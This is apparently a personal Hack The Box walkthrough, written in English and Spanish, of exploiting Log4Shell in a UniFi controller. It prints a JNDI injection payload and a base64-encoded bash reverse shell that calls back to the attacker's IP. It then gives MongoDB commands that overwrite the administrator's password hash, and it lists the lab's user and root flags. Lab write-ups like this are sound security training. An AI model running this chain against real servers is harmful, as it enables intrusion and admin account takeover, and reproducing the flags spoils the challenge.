
My classic scann doesnt work , it just discovered the port 22 and the 8080, when I was going to the 8443 

22/tcp   open  ssh
6789 /tcp open ibm-db2-admin?
8080/tcp open  http-proxy
8443/tcp open ssl/nagios-sca Nagios NSCA

```
-sC -sV -v 10.129.154.2
```


There is a vulnerability on Unifi 

CVE-2021-44228

So, here we are going to use whatweb, so maybe we can see some services working behind of that website

https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

https://www.google.com/search?q=cve+unifi+6.4.54&sca_esv=562265780&ei=ifbzZIw838vWxA_b1pLABw&oq=CVE-2021-44228+unifi&gs_lp=Egxnd3Mtd2l6LXNlcnAiFENWRS0yMDIxLTQ0MjI4IHVuaWZpKgIIADIFEAAYogRI90BQ3ARYtR9wA3gBkAEAmAGVAaAB1AuqAQQxNi4xuAEDyAEA-AEBwgIKEAAYRxjWBBiwA8ICBhAAGBYYHsICBhAAGAgYHuIDBBgAIEGIBgGQBgg&sclient=gws-wiz-serp

THe exploit is  "rogue-jndi"

and JNDI is this: 
JNDI es una **capa de abstracción Java para servicios de directorio**, del mismo modo que JDBC (Java Database Connectivity) es una capa de abstracción para bases de datos.


### What protocol does JNDI leverage in the injection?###

The JNDI injection can leverage specific protocols to request a malicious payload from an attacker's infrastructure – including **LDAP, Secure LDAP (LDAPS), Remote Method Invocation (RMI), Domain Name Service (DNS)**.

The LDAP works on the port 389 in most of the servers. 

El protocolo ligero de acceso a directorios hace referencia a un protocolo a nivel de aplicación que permite el acceso a un servicio de directorio ordenado y distribuido para buscar diversa información en un entorno de red.

Well, I need to do this attack, on this two sites I have some info

https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

and the repository to get the exploit its here

https://github.com/veracode-research/rogue-jndi


Strangely, the hints on htb says that you can intercept the traffic with tcpdump, for sure, I think you loock the traffic between you and the machine on the port 389. Then is another hint about mongodb. I will go for the first place that is start the attack and then I will go if i need to do something like this


## The exploit ##

First we need to see if its vulnerable, intercept the petition to UniFi with burpsuit

FInally I intercepted the trafic between the website loggin UniFI network

This was the place where I must put the payload

```
{"username":"test","password":"test","remember":"${jndi:ldap://10.10.16.11/whatever}","strict":true}
```

JNDI is the acronym for the Java Naming and Directory Interface API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.
LDAP is the acronym for Lightweight Directory Access Protocol , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information
services over the Internet or a Network. The default port that LDAP runs on is port 389 .

The response is 

```
{"meta":{"rc":"error","msg":"api.err.InvalidPayload"},"data":[]}
```
It says that is invalid but, it works

If we want to send the petition , we can do it with tcp dump. And we can be sure if it was success or not
```
sudo tcpdump -i tun0 port 389
```

So now , we need to download Open-JDK and Maven in order to build a payload an execute remote code on the vulnerable system .


### about jdk and maven ###

Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile our projects into jar files . These applications will also help us run the rogue-jndi Java application, which starts a local LDAP server and allows us to receive connections back from the vulnerable server and execute malicious code. Once we have installed Open-JDK, we can proceed to install Maven. But first, let’s switch to root user.

```
sudo apt install openjdk-11-jdk -y

sudo apt-get install maven

```


Once we have installed the required packages, we now need to download and build the Rogue-JNDI Java application. Let's clone the respective repository and build the package using Maven.

```
git clone https://github.com/veracode-research/rogue-jndi 
cd rogue-jndi 
mvn package
```

This will create a .jar file in rogue-jndi/target/ directory called RogueJndi-1.1.jar . Now we can construct our payload to pass into the RogueJndi-1-1.jar Java application. To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding issues.

```
echo 'bash -c bash -i >&/dev/tcp/10.10.16.11/443 0>&1' | base64
```
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTEvNDQ0NCAwPiYxCg==

After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the --command option and your tun0 IP address to the --hostname option.

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "YOUR TUN0 IP ADDRESS"
```

Now that the server is listening locally on port 389 , let's open another terminal and start a Netcat listener to capture the reverse shell.

```
nc -lvp 443
```

Going back to our intercepted POST request, let's change the payload to ${jndi:ldap://Your Tun0 IP:1389/o=tomcat} and click Send .

I had some erros, remember do not put the {} on the spaces where it says something like "put your ip here"

cd /home/michael

```
user flag : 6ced1a6a89e666c0620cdb10262ba127
```
The article states we can get access to the administrator panel of the UniFi application and possibly extract SSH secrets used between the appliances. First let's check if MongoDB is running on the target system, which might make it possible for us to extract credentials in order to login to the administrative panel.

```
67  0.3  4.2 1103744 85624 ?       Sl   18:35   0:18 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
```

Let's interact with the MongoDB service by making use of the mongo command line utility and attempting to extract the administrator password. A quick Google search using the keywords UniFi Default Database shows that the default database name for the UniFi application is ace .


```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
```

![[Screenshot_2023-09-04_15_09_47.png]]

The output reveals a user called Administrator. Their password hash is located in the x_shadow variable but in this instance it cannot be cracked with any password cracking utilities. Instead we can change the x_shadow password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the mkpasswd command line utility.

```
mkpasswd -m sha-512 Password1234
```
the pass
```
$6$Rag5SS8kW0Zz7elG$8Ukmicejrk1IpMtevOgjEQGh/SZ93Q14izhwqQ0PPlLnISUEWgXdEXwvhmZugYPKi.JcY8aTi8XfASh0W5n97/
```
note
```
The $6$ is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case, therefore we will have to make a hash of the same type.
```
SHA-512, or Secure Hash Algorithm 512, is a hashing algorithm used to convert text of any length into a fixed-size string. Each output produces a SHA-512 length of 512 bits (64 bytes). This algorithm is commonly used for email addresses hashing, password hashing...



Now we need to change the password on the json db, with this command:

```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```

```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$u1oGgNvYAWFUoqFe$QVPYq0.8tAjZiINvX./EkQFAX/WW8NqooFUwoV9wYzINFxVgKZilJmnck8LsyayxGyU30Ypu3pA1NIddKwASW0"}})'
```

Let's now visit the website and log in as administrator . It is very important to note that the username is case sensitive

UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal. Navigate to settings -> site and scroll down to find the SSH Authentication setting. SSH authentication with a root password has been enabled.



this is the root flag 

```
e50bc93c75b634e4b272d2f771c33681
```